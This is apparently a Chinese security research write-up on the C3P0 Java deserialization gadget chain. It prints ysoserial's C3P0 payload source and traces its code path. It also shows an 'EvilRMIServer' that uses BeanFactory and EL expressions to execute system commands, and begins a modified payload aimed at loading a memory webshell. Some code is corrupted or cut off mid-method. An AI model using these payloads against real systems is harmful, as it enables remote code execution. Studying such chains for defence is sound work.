S-C3P0反序列化
起因
一个关于 fastjson 不出网的利用方法，利用 C3P0 结合 ROME 二次反序列化注入内存马。
漏洞原理
yso源码
首先来看 yso 的构造链，以及如何生成 payload 。构造链：
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject -
> com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject -
> com.sun.jndi.rmi.registry.RegistryContext->lookup
package ysoserial.payloads;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
/**
 * com.sun.jndi.rmi.registry.RegistryContext->lookup
 * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized->getObject
 * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase->readObject
 *
 * Arguments:
 * - base_url:classname
 * Yields:
 * - Instantiation of remotely loaded class
 * @author mbechler
 *
 */
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-
java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P0 implements ObjectPayload {
序列化的过程，首先创建一个 PoolBackedDataSource 对象，然后通过反射将
connectionPoolDataSource 属性修改为 PoolSource 的实例化对象。所以此处查看一下序列化
的过程。
序列化过程
    public Object getObject ( String command ) throws Exception {
        int sep = command.lastIndexOf(':');
        if ( sep :
");
        }
        String url = command.substring(0, sep);
        String className = command.substring(sep + 1);
        PoolBackedDataSource b = 
Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, 
"connectionPoolDataSource").set(b, new PoolSource(className, url));
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, 
Referenceable {
        private String className;
        private String url;
        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }
        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }
        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException 
{return null;}
        public PooledConnection getPooledConnection () throws SQLException 
{return null;}
        public PooledConnection getPooledConnection ( String user, String 
password ) throws SQLException {return null;}
    }
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(C3P0.class, args);
    }
}
类继承关系
根据类的继承关系，在序列化的时候进入到 PoolBackedDataSourceBase#writeObject() ，此
处应该已经通过反射修改了 this.connectionPoolDataSource 的值为 PoolSource ，而这个类
没有继承 Serializable 接口，会反序列化出错从而进入到 catch 的逻辑中。然后在进入到
indirector.indirectForm(this.connectionPoolDataSource) 中。
这个 var2 就是 PoolSource#getReference() 返回的 Reference 对象。这里面的 classFactory
和 classFactoryLocation 两个参数可以关注一下，后面应该有用。然后序列化的过程关注到
这。之后是反序列化的过程。
反序列化过程
反序列化入口
反序列化的入口在 com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase#readObject()
中，所以具体来看看这个方法。
首先是或者这个 version ，然后 version 为1的话进入分支。此处进入分支之后可以看到，如果
对象是 IndirectlySerialized 的实例，就会执行 getObject 方法。根据上面的序列化过程，序
列化的对象 ReferenceSerialized 是 IndirectlySerialized 的实现类。那么反序列化过程接
着进入到 ReferenceSerialized#getObject() 方法中。
根据序列化的过程， this.reference 参数有值，其余全部为空，所以逻辑进入到第88行
ReferenceableUtils.referenceToObject(this.reference, this.name, var2, 
this.env) 。
此处先是获取 Reference 对象初始化时传递的 classFactory 和 classFactoryLocation 两个参
数，然后如果 classFactoryLocation 不为空，可以通过 URLClassLoader 远程加载类。如果为
空，可以通过 Class.forName 进行本地类加载，然后执行类的构造方法，后续在执行
getObjectInstance() 方法。其中 forName 方法的 initialize 参数为 true ，那么给定的类如
果之前没有被初始化过，那么会被初始化。到此的话反序列化已经可以实现一个攻击了，可以通
过 URLClassLoader 加载远程类，或者可以直接加载本地类。
一点小思考
在反序列化的最后一个过程中，通过 Class.forName 的方式加载类，创建对象，然后执行对象的
getObjectInstence 方法，在之前关于 JNDI 高版本的绕过的实现原理中 ，RMI协议 绕过有利用
org.apache.naming.factory.BeanFactory 这个本地工厂进行绕过。后面执行的就是
org.apache.naming.factory.BeanFactory#getObjectInstance ，此处也正好是可以利用
的。我们先来看看 RMI 绕过的代码。
通过创建一个 ResourceRef 对象，然后绑定 org.apache.naming.factory.BeanFactory 工厂
类。接下来看看 ResourceRef 对象的初始化。
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1088");
        Registry registry = LocateRegistry.createRegistry(1088);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为
org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", 
true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见
BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "a=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("a", 
"Runtime.getRuntime().exec(\"notepad.exe\")"));
        ReferenceWrapper referenceWrapper = new 
com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
ResourceRef 继承自 Reference 类，然后构造方法中，首先调用 Reference 的构造方法，其中
传递的 factory 参数就是 org.apache.naming.factory.BeanFactory 工厂类，这个
factoryLocation 根据之前分析的逻辑，应该为空，这样就可以通过 Class.forName 去加载本
地类了。根据上面的分析，我们简单修改 PoolSource 的代码，如下：
package ysoserial.payloads;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
@PayloadTest ( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-
java:0.2.11"} )
@Authors({ Authors.MBECHLER })
public class C3P0 implements ObjectPayload {
    public Object getObject ( String command ) throws Exception {
        PoolBackedDataSource b = 
Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, 
"connectionPoolDataSource").set(b, new PoolSource());
那么此处就可以利用 EL 表达式去执行任意代码了。
C3P0-扩展攻击
        return b;
    }
    private static final class PoolSource implements ConnectionPoolDataSource, 
Referenceable {
        private String className;
        private String url;
        public PoolSource(){}
        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }
        public Reference getReference () throws NamingException {